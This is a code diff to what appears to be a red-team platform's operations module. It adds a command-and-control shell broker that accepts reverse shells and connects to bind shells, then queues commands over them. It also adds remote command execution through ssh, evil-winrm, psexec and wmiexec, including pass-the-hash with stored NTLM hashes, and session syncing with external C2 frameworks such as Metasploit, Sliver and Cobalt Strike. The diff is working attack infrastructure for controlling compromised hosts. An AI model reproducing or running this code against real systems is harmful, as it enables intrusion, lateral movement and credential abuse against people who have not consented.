@@ -5,9 +5,14 @@ import hashlib
 import hmac
 import json
 import logging
+import os
 import secrets
 import shlex
+import shutil
+import socket
+import subprocess
 import threading
+import time
 import uuid
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime, timedelta, timezone
@@ -92,9 +97,21 @@ def public_resource(row: Any) -> dict[str, Any]:
     item["has_secret"] = bool(secret)
     item["worker_paused"] = bool(item.get("worker_paused"))
     item["locked"] = bool(item.get("locked_by"))
+    item["source_project_id"] = item.get("project_id") or item["metadata"].get("source_project_id")
+    item["scope"] = "global"
+    item["source"] = {
+        "project_id": item["source_project_id"],
+        "intent_id": item.get("intent_id"),
+        "worker": item.get("worker"),
+        "task_id": item.get("source_task_id"),
+        "created_by_type": item.get("created_by_type"),
+        "created_by": item.get("created_by"),
+    }
     if item["kind"] == "c2_listener":
         item["checkin_path"] = f"/c2/checkin/{item['id']}"
-    if item["kind"] == "c2_session":
+    if item["kind"] == "c2_session" and str(
+        item["metadata"].get("connection_type") or "beacon"
+    ).lower() in {"beacon", "agent"}:
         item["poll_path"] = f"/c2/sessions/{item['id']}/poll"
     return item
 
@@ -116,7 +133,7 @@ def public_audit(row: Any) -> dict[str, Any]:
 def audit_event(
     conn,
     *,
-    project_id: str,
+    project_id: str | None,
     resource_id_value: str | None,
     task_id_value: str | None,
     actor_type: str,
@@ -125,6 +142,11 @@ def audit_event(
     status: str,
     detail: dict[str, Any] | None = None,
 ) -> None:
+    # The URL-level ``_global`` placeholder is a no-project shortcut for
+    # shared resources. Persist it as NULL so the FK to ``projects`` keeps
+    # holding and the event hub still distinguishes global traffic.
+    if project_id == "_global":
+        project_id = None
     now = utcnow()
     safe_detail = detail or {}
     cursor = conn.execute(
@@ -147,7 +169,7 @@ def audit_event(
         ),
     )
     event_hub.publish(
-        project_id,
+        project_id or "__global__",
         {
             "type": "resource.audit",
             "id": cursor.lastrowid,
@@ -164,30 +186,38 @@ def audit_event(
     )
 
 
-def expire_stale_c2_sessions(conn, project_id: str) -> list[str]:
+def expire_stale_c2_sessions(conn, project_id: str | None = None) -> list[str]:
     cutoff = (datetime.now(timezone.utc) - timedelta(seconds=C2_STALE_SECONDS)).strftime(
         "%Y-%m-%dT%H:%M:%SZ"
     )
-    rows = conn.execute(
-        """
-        SELECT id FROM shared_resources
-        WHERE project_id = ? AND kind = 'c2_session' AND status = 'available'
-          AND last_seen_at IS NOT NULL AND last_seen_at < ?
-        """,
-        (project_id, cutoff),
+    clauses = ["kind = 'c2_session'", "status = 'available'", "last_seen_at IS NOT NULL", "last_seen_at < ?"]
+    params: list[Any] = [cutoff]
+    if project_id is not None:
+        clauses.append("project_id = ?")
+        params.append(project_id)
+    candidates = conn.execute(
+        f"SELECT id, project_id, metadata_json FROM shared_resources WHERE {' AND '.join(clauses)}",
+        params,
     ).fetchall()
+    rows = [
+        row
+        for row in candidates
+        if str(json_load(row["metadata_json"], {}).get("connection_type") or "beacon").lower()
+        in {"beacon", "agent"}
+    ]
     if not rows:
         return []
     now = utcnow()
     ids = [row["id"] for row in rows]
-    for session_id in ids:
+    for row in rows:
+        session_id = row["id"]
         conn.execute(
             "UPDATE shared_resources SET status = 'offline', updated_at = ? WHERE id = ?",
             (now, session_id),
         )
         audit_event(
             conn,
-            project_id=project_id,
+            project_id=row["project_id"],
             resource_id_value=session_id,
             task_id_value=None,
             actor_type="system",
@@ -222,7 +252,7 @@ def _fact_summary(kind: str, name: str, rid: str, target: str, summary: str) -> 
 def create_resource(
     conn,
     *,
-    project_id: str,
+    project_id: str | None,
     kind: str,
     name: str,
     target: str = "",
@@ -243,19 +273,46 @@ def create_resource(
         raise ValueError(f"unsupported resource kind: {kind}")
     rid = resource_id(kind)
     now = utcnow()
+    resource_metadata = dict(metadata or {})
+    if project_id is not None:
+        resource_metadata.setdefault("source_project_id", project_id)
     resource_secret = dict(secret or {})
     secret_once: str | None = None
     if kind == "c2_listener":
         secret_once = secrets.token_urlsafe(32)
         resource_secret = {
+            **resource_secret,
             "listener_token_sha256": hash_token(secret_once),
             "listener_token": secret_once,
         }
         status = status if status in {"available", "offline"} else "offline"
+    if kind == "c2_session":
+        connection_type = str(resource_metadata.get("connection_type") or "beacon").lower()
+        if connection_type in {"reverse", "reverse_shell"} and parent_resource_id is None:
+            raise ValueError("reverse shell sessions must reference a C2 listener")
+        credential_id = str(resource_metadata.get("credential_id") or "")
+        if credential_id:
+            credential = conn.execute(
+                "SELECT metadata_json, secret_json FROM shared_resources WHERE id = ? AND kind = 'credential_ref'",
+                (credential_id,),
+            ).fetchone()
+            if credential is None:
+                raise ValueError("credential resource not found")
+            resource_metadata = {
+                **json_load(credential["metadata_json"], {}),
+                **resource_metadata,
+            }
+            resource_secret = {
+                **json_load(credential["secret_json"], {}),
+                **resource_secret,
+            }
+        if connection_type in {"beacon", "agent"} and "session_token_sha256" not in resource_secret:
+            secret_once = secrets.token_urlsafe(32)
+            resource_secret["session_token_sha256"] = hash_token(secret_once)
     if parent_resource_id is not None:
         parent = conn.execute(
-            "SELECT id FROM shared_resources WHERE id = ? AND project_id = ?",
-            (parent_resource_id, project_id),
+            "SELECT id FROM shared_resources WHERE id = ?",
+            (parent_resource_id,),
         ).fetchone()
         if parent is None:
             raise ValueError("parent resource not found")
@@ -275,7 +332,7 @@ def create_resource(
             status,
             target.strip(),
             summary.strip(),
-            json_dump(metadata or {}),
+            json_dump(resource_metadata),
             json_dump(resource_secret),
             actor_type,
             actor,
@@ -289,7 +346,7 @@ def create_resource(
             now if kind == "c2_session" else None,
         ),
     )
-    if publish_fact and fact_id is None and kind in {
+    if project_id is not None and publish_fact and fact_id is None and kind in {
         "webshell",
         "c2_listener",
         "c2_session",
@@ -643,6 +700,455 @@ def execute_plugin(resource: Any, task: Any) -> str:
     return response.text
 
 
+def execute_direct_session(resource: Any, task: Any) -> str:
+    metadata = json_load(resource["metadata_json"], {})
+    secret = json_load(resource["secret_json"], {})
+    arguments = json_load(task["input_json"], {})
+    command = str(arguments.get("command") or "")
+    if not command:
+        raise ValueError("command is required")
+    shell_type = str(metadata.get("shell_type") or "custom").lower()
+    connection_type = str(metadata.get("connection_type") or "direct").lower()
+    if connection_type == "external_c2":
+        endpoint = str(secret.get("endpoint") or metadata.get("endpoint") or "").rstrip("/")
+        if not endpoint:
+            raise ValueError("external C2 adapter endpoint is required")
+        headers = {"Accept": "application/json, text/plain"}
+        if secret.get("token"):
+            headers["Authorization"] = f"Bearer {secret['token']}"
+        response = requests.post(
+            endpoint,
+            json={
+                "framework": metadata.get("framework") or shell_type,
+                "session_id": metadata.get("external_session_id") or resource["target"],
+                "action": task["action"],
+                "arguments": arguments,
+            },
+            headers=headers,
+            timeout=min(max(float(arguments.get("timeout") or 60), 1), 300),
+        )
+        response.raise_for_status()
+        return response.text
+
+    target = resource["target"]
+    username = str(secret.get("username") or metadata.get("username") or "")
+    password = str(secret.get("password") or secret.get("value") or "")
+    credential_hash = str(secret.get("hash") or secret.get("ntlm_hash") or "")
+    domain = str(secret.get("domain") or metadata.get("domain") or "")
+    timeout = min(max(float(arguments.get("timeout") or 60), 1), 300)
+    stdin_input: str | None = None
+    process_env: dict[str, str] | None = None
+    if shell_type == "ssh":
+        executable = str(metadata.get("executable") or "ssh")
+        destination = f"{username}@{target}" if username else target
+        argv = [executable, "-o", "StrictHostKeyChecking=accept-new"]
+        port = int(metadata.get("port") or 22)
+        if port != 22:
+            argv.extend(["-p", str(port)])
+        key_path = str(secret.get("private_key_path") or "")
+        if key_path:
+            argv.extend(["-o", "BatchMode=yes", "-i", key_path])
+        elif password:
+            sshpass = str(metadata.get("sshpass_executable") or shutil.which("sshpass") or "")
+            if not sshpass:
+                raise RuntimeError("password SSH requires sshpass; use an SSH key or configure sshpass_executable")
+            argv = [sshpass, "-e", *argv]
+            process_env = {**os.environ, "SSHPASS": password}
+        else:
+            argv.extend(["-o", "BatchMode=yes"])
+        argv.extend([destination, command])
+    elif shell_type == "evil_winrm":
+        argv = [str(metadata.get("executable") or "evil-winrm"), "-i", target, "-u", username]
+        if password:
+            argv.extend(["-p", password])
+        elif credential_hash:
+            argv.extend(["-H", credential_hash])
+        stdin_input = f"{command}\nexit\n"
+    elif shell_type in {"psexec", "wmi"}:
+        executable = str(metadata.get("executable") or ("psexec.py" if shell_type == "psexec" else "wmiexec.py"))
+        principal = f"{domain}/{username}" if domain else username
+        credential = f"{principal}:{password}@{target}" if password else f"{principal}@{target}"
+        argv = [executable]
+        if credential_hash:
+            argv.extend(["-hashes", credential_hash])
+        argv.extend([credential, command])
+    else:
+        argv = [str(metadata.get("executable") or shell_type)]
+        argv.extend(str(item) for item in metadata.get("arguments", []))
+        argv.extend([target, command])
+    completed = subprocess.run(
+        argv,
+        capture_output=True,
+        text=True,
+        timeout=timeout,
+        check=False,
+        input=stdin_input,
+        env=process_env,
+    )
+    output = (completed.stdout or "") + (completed.stderr or "")
+    if completed.returncode:
+        raise RuntimeError(output.strip() or f"{shell_type} exited with {completed.returncode}")
+    return output
+
+
+class ShellBroker:
+    """Own raw reverse/bind sockets and expose them through the normal task queue."""
+
+    def __init__(self) -> None:
+        self._listeners: dict[str, socket.socket] = {}
+        self._external_stops: dict[str, threading.Event] = {}
+        self._sessions: dict[str, socket.socket] = {}
+        self._session_listener: dict[str, str] = {}
+        self._session_locks: dict[str, threading.Lock] = {}
+        self._lock = threading.RLock()
+
+    def start_listener(self, resource: Any) -> None:
+        metadata = json_load(resource["metadata_json"], {})
+        listener_type = str(metadata.get("listener_type") or "").lower()
+        if listener_type in {"msf", "sliver", "cobalt_strike", "custom"}:
+            self.stop_listener(resource["id"])
+            stop = threading.Event()
+            with self._lock:
+                self._external_stops[resource["id"]] = stop
+            threading.Thread(
+                target=self._sync_external,
+                args=(dict(resource), stop),
+                daemon=True,
+                name=f"redtrace-{listener_type}-{resource['id']}",
+            ).start()
+            return
+        if listener_type not in {"tcp_reverse", "tcp_bind"}:
+            return
+        self.stop_listener(resource["id"])
+        target = self._listener_target(metadata, listener_type)
+        thread_target = self._accept_reverse if listener_type == "tcp_reverse" else self._connect_bind
+        threading.Thread(
+            target=thread_target,
+            args=(dict(resource), *target),
+            daemon=True,
+            name=f"redtrace-{listener_type}-{resource['id']}",
+        ).start()
+
+    def stop_listener(self, listener_id: str) -> None:
+        with self._lock:
+            server = self._listeners.pop(listener_id, None)
+            stop = self._external_stops.pop(listener_id, None)
+            session_ids = [sid for sid, parent in self._session_listener.items() if parent == listener_id]
+        if stop is not None:
+            stop.set()
+        if server is not None:
+            try:
+                server.close()
+            except OSError:
+                pass
+        for session_id in session_ids:
+            self._drop_session(session_id)
+
+    def shutdown(self) -> None:
+        """Release listener and session transports while keeping the broker reusable."""
+        with self._lock:
+            listener_ids = set(self._listeners) | set(self._external_stops)
+            session_ids = set(self._sessions)
+        for listener_id in listener_ids:
+            self.stop_listener(listener_id)
+        for session_id in session_ids:
+            self._drop_session(session_id)
+
+    def has_session(self, session_id: str) -> bool:
+        with self._lock:
+            return session_id in self._sessions
+
+    def execute(self, session_id: str, command: str, timeout: float = 20.0) -> str:
+        with self._lock:
+            channel = self._sessions.get(session_id)
+            channel_lock = self._session_locks.setdefault(session_id, threading.Lock())
+        if channel is None:
+            raise RuntimeError("raw shell channel is offline")
+        timeout = min(max(float(timeout), 0.5), 300.0)
+        with channel_lock:
+            try:
+                channel.sendall(command.encode("utf-8") + b"\n")
+                chunks: list[bytes] = []
+                deadline = time.monotonic() + timeout
+                last_data = time.monotonic()
+                while time.monotonic() < deadline:
+                    try:
+                        chunk = channel.recv(65536)
+                    except socket.timeout:
+                        if chunks and time.monotonic() - last_data >= 0.5:
+                            break
+                        continue
+                    if not chunk:
+                        raise ConnectionError("shell channel closed")
+                    chunks.append(chunk)
+                    last_data = time.monotonic()
+                return b"".join(chunks).decode("utf-8", errors="replace")
+            except (OSError, ConnectionError):
+                self._drop_session(session_id)
+                raise
+
+    @staticmethod
+    def _listener_target(metadata: dict[str, Any], listener_type: str) -> tuple[str, int]:
+        host_key = "target_host" if listener_type == "tcp_bind" else "bind_host"
+        host = str(metadata.get(host_key) or ("127.0.0.1" if listener_type == "tcp_bind" else "0.0.0.0"))
+        port = int(metadata.get("bind_port") or metadata.get("target_port") or 0)
+        if not 1 <= port <= 65535:
+            raise ValueError("listener port must be between 1 and 65535")
+        return host, port
+
+    def _accept_reverse(self, resource: dict[str, Any], host: str, port: int) -> None:
+        server = socket.socket(socket.AF_INET6 if ":" in host else socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            server.bind((host, port))
+            server.listen(32)
+            server.settimeout(1.0)
+            with self._lock:
+                self._listeners[resource["id"]] = server
+            while True:
+                with self._lock:
+                    if self._listeners.get(resource["id"]) is not server:
+                        return
+                try:
+                    channel, peer = server.accept()
+                except socket.timeout:
+                    continue
+                except OSError:
+                    return
+                self._attach_channel(resource, channel, peer, "reverse")
+        except OSError as exc:
+            LOG.error("C2 reverse listener failed id=%s error=%s", resource["id"], exc)
+            self._mark_listener(resource["id"], "degraded", str(exc))
+        finally:
+            try:
+                server.close()
+            except OSError:
+                pass
+
+    def _connect_bind(self, resource: dict[str, Any], host: str, port: int) -> None:
+        try:
+            channel = socket.create_connection((host, port), timeout=10.0)
+            self._attach_channel(resource, channel, (host, port), "bind")
+        except OSError as exc:
+            LOG.error("C2 bind connector failed id=%s error=%s", resource["id"], exc)
+            self._mark_listener(resource["id"], "degraded", str(exc))
+
+    def _sync_external(self, resource: dict[str, Any], stop: threading.Event) -> None:
+        metadata = json_load(resource["metadata_json"], {})
+        secret = json_load(resource["secret_json"], {})
+        framework = str(metadata.get("listener_type") or "custom")
+        endpoint = str(secret.get("adapter_endpoint") or metadata.get("adapter_endpoint") or "").rstrip("/")
+        if not endpoint:
+            self._mark_listener(resource["id"], "degraded", "external C2 adapter_endpoint is required")
+            return
+        headers = {"Accept": "application/json"}
+        if secret.get("token"):
+            headers["Authorization"] = f"Bearer {secret['token']}"
+        interval = min(max(float(metadata.get("sync_interval") or 5), 1), 300)
+        while not stop.is_set():
+            try:
+                response = requests.get(
+                    f"{endpoint}/sessions",
+                    params={"framework": framework},
+                    headers=headers,
+                    timeout=min(interval, 30),
+                )
+                response.raise_for_status()
+                payload = response.json()
+                sessions = payload.get("sessions", []) if isinstance(payload, dict) else payload
+                if not isinstance(sessions, list):
+                    raise ValueError("external C2 adapter sessions response must be a list")
+                self._upsert_external_sessions(resource, framework, endpoint, secret, sessions)
+            except Exception as exc:
+                LOG.warning("external C2 sync failed id=%s error=%s", resource["id"], exc)
+            stop.wait(interval)
+
+    @staticmethod
+    def _upsert_external_sessions(
+        listener: dict[str, Any],
+        framework: str,
+        endpoint: str,
+        listener_secret: dict[str, Any],
+        sessions: list[Any],
+    ) -> None:
+        now = utcnow()
+        seen: set[str] = set()
+        with db.get_conn() as conn:
+            current_listener = conn.execute(
+                "SELECT project_id, metadata_json FROM shared_resources WHERE id = ?",
+                (listener["id"],),
+            ).fetchone()
+            resource_project_id = current_listener["project_id"] if current_listener is not None else None
+            listener_metadata = json_load(
+                current_listener["metadata_json"] if current_listener is not None else listener.get("metadata_json"),
+                {},
+            )
+            source_project_id = resource_project_id or listener_metadata.get("source_project_id")
+            for raw in sessions:
+                if not isinstance(raw, dict):
+                    continue
+                external_id = str(raw.get("id") or raw.get("session_id") or raw.get("external_id") or "")
+                if not external_id:
+                    continue
+                seen.add(external_id)
+                row = conn.execute(
+                    "SELECT id FROM shared_resources WHERE kind = 'c2_session' AND parent_resource_id = ? AND target = ?",
+                    (listener["id"], external_id),
+                ).fetchone()
+                session_metadata = {
+                    **raw,
+                    **({"source_project_id": source_project_id} if source_project_id else {}),
+                    "framework": framework,
+                    "connection_type": "external_c2",
+                    "shell_type": str(raw.get("shell_type") or framework),
+                    "external_session_id": external_id,
+                }
+                if row is None:
+                    create_resource(
+                        conn,
+                        project_id=resource_project_id,
+                        kind="c2_session",
+                        name=str(raw.get("name") or raw.get("hostname") or f"{framework}:{external_id}"),
+                        target=external_id,
+                        summary=str(raw.get("summary") or f"{framework} session"),
+                        metadata=session_metadata,
+                        secret={
+                            "endpoint": f"{endpoint}/execute",
+                            "token": listener_secret.get("token", ""),
+                        },
+                        actor_type="system",
+                        actor=f"listener:{listener['id']}",
+                        parent_resource_id=listener["id"],
+                        publish_fact=True,
+                    )
+                else:
+                    conn.execute(
+                        "UPDATE shared_resources SET status = 'available', metadata_json = ?, updated_at = ?, last_seen_at = ? WHERE id = ?",
+                        (json_dump(session_metadata), now, now, row["id"]),
+                    )
+            existing = conn.execute(
+                "SELECT id, target FROM shared_resources WHERE kind = 'c2_session' AND parent_resource_id = ?",
+                (listener["id"],),
+            ).fetchall()
+            for row in existing:
+                if row["target"] not in seen:
+                    conn.execute(
+                        "UPDATE shared_resources SET status = 'offline', updated_at = ? WHERE id = ?",
+                        (now, row["id"]),
+                    )
+
+    def _attach_channel(
+        self,
+        listener: dict[str, Any],
+        channel: socket.socket,
+        peer: tuple[Any, ...],
+        connection_type: str,
+    ) -> None:
+        channel.settimeout(0.2)
+        host, port = str(peer[0]), int(peer[1])
+        with db.get_conn() as conn:
+            current_listener = conn.execute(
+                "SELECT project_id, metadata_json FROM shared_resources WHERE id = ?",
+                (listener["id"],),
+            ).fetchone()
+            resource_project_id = current_listener["project_id"] if current_listener is not None else None
+            listener_metadata = json_load(
+                current_listener["metadata_json"] if current_listener is not None else listener.get("metadata_json"),
+                {},
+            )
+            source_project_id = resource_project_id or listener_metadata.get("source_project_id")
+            session, _ = create_resource(
+                conn,
+                project_id=resource_project_id,
+                kind="c2_session",
+                name=f"{connection_type}:{host}:{port}",
+                target=f"{host}:{port}",
+                summary=f"{connection_type} raw TCP shell",
+                status="available",
+                metadata={
+                    "connection_type": connection_type,
+                    "shell_type": "raw_tcp",
+                    "transport": "tcp",
+                    "hostname": host,
+                    "peer_port": port,
+                    "capabilities": ["command"],
+                    **({"source_project_id": source_project_id} if source_project_id else {}),
+                },
+                actor_type="system",
+                actor=f"listener:{listener['id']}",
+                parent_resource_id=listener["id"],
+                publish_fact=True,
+            )
+            session_id = session["id"]
+            audit_event(
+                conn,
+                project_id=resource_project_id,
+                resource_id_value=session_id,
+                task_id_value=None,
+                actor_type="system",
+                actor=f"listener:{listener['id']}",
+                action="c2.session_online",
+                status="succeeded",
+                detail={"connection_type": connection_type, "peer": f"{host}:{port}"},
+            )
+        with self._lock:
+            self._sessions[session_id] = channel
+            self._session_listener[session_id] = listener["id"]
+            self._session_locks[session_id] = threading.Lock()
+
+    def _drop_session(self, session_id: str) -> None:
+        with self._lock:
+            channel = self._sessions.pop(session_id, None)
+            self._session_listener.pop(session_id, None)
+            self._session_locks.pop(session_id, None)
+        if channel is not None:
+            try:
+                channel.close()
+            except OSError:
+                pass
+        with db.get_conn() as conn:
+            row = conn.execute("SELECT project_id FROM shared_resources WHERE id = ?", (session_id,)).fetchone()
+            conn.execute(
+                "UPDATE shared_resources SET status = 'offline', updated_at = ? WHERE id = ?",
+                (utcnow(), session_id),
+            )
+            if row is not None:
+                audit_event(
+                    conn,
+                    project_id=row["project_id"],
+                    resource_id_value=session_id,
+                    task_id_value=None,
+                    actor_type="system",
+                    actor="shell-broker",
+                    action="c2.session_offline",
+                    status="offline",
+                )
+
+    @staticmethod
+    def _mark_listener(listener_id: str, status_value: str, error: str) -> None:
+        with db.get_conn() as conn:
+            row = conn.execute("SELECT project_id FROM shared_resources WHERE id = ?", (listener_id,)).fetchone()
+            conn.execute(
+                "UPDATE shared_resources SET status = ?, summary = ?, updated_at = ? WHERE id = ?",
+                (status_value, error[:1000], utcnow(), listener_id),
+            )
+            if row is not None:
+                audit_event(
+                    conn,
+                    project_id=row["project_id"],
+                    resource_id_value=listener_id,
+                    task_id_value=None,
+                    actor_type="system",
+                    actor="shell-broker",
+                    action="c2.listener_error",
+                    status=status_value,
+                    detail={"error": error[:1000]},
+                )
+
+
+shell_broker = ShellBroker()
+
+
 class OperationExecutor:
     def __init__(self) -> None:
         self._pool = ThreadPoolExecutor(max_workers=8, thread_name_prefix="redtrace-operation")
@@ -713,14 +1219,12 @@ class OperationExecutor:
             if task is None or task["status"] != "queued" or task["cancel_requested"]:
                 return
             resource = conn.execute(
-                "SELECT * FROM shared_resources WHERE id = ? AND project_id = ?",
-                (task["resource_id"], task["project_id"]),
+                "SELECT * FROM shared_resources WHERE id = ?",
+                (task["resource_id"],),
             ).fetchone()
             if resource is None:
                 return
-            if resource["kind"] == "c2_session":
-                return
-            if resource["kind"] not in EXECUTABLE_KINDS:
+            if resource["kind"] not in EXECUTABLE_KINDS | {"c2_session"}:
                 self._finish_failure(conn, task, resource, "resource does not support operations")
                 return
             now = utcnow()
@@ -742,6 +1246,16 @@ class OperationExecutor:
         try:
             if resource["kind"] == "webshell":
                 output = execute_webshell(resource, task)
+            elif resource["kind"] == "c2_session":
+                if shell_broker.has_session(resource["id"]):
+                    arguments = json_load(task["input_json"], {})
+                    output = shell_broker.execute(
+                        resource["id"],
+                        str(arguments.get("command") or ""),
+                        float(arguments.get("timeout") or 20),
+                    )
+                else:
+                    output = execute_direct_session(resource, task)
             else:
                 output = execute_plugin(resource, task)
         except Exception as exc:
@@ -845,14 +1359,27 @@ def resume_pending_tasks() -> None:
     with db.get_conn() as conn:
         rows = conn.execute(
             """
-            SELECT t.id
+            SELECT t.id, t.resource_id, r.kind, r.metadata_json
             FROM operation_tasks t
             JOIN shared_resources r ON r.id = t.resource_id
             WHERE t.status = 'queued'
               AND t.cancel_requested = 0
-              AND r.kind IN ('webshell', 'plugin')
+              AND r.kind IN ('webshell', 'plugin', 'c2_session')
             ORDER BY t.created_at
             """
         ).fetchall()
     for row in rows:
-        operation_executor.submit(row["id"])
+        metadata = json_load(row["metadata_json"], {})
+        if row["kind"] != "c2_session" or str(metadata.get("connection_type") or "beacon").lower() in {
+            "direct", "external_c2"
+        } or shell_broker.has_session(row["resource_id"]):
+            operation_executor.submit(row["id"])
+
+
+def resume_c2_listeners() -> None:
+    with db.get_conn() as conn:
+        listeners = conn.execute(
+            "SELECT * FROM shared_resources WHERE kind = 'c2_listener' AND status = 'available'"
+        ).fetchall()
+    for listener in listeners:
+        shell_broker.start_listener(listener)
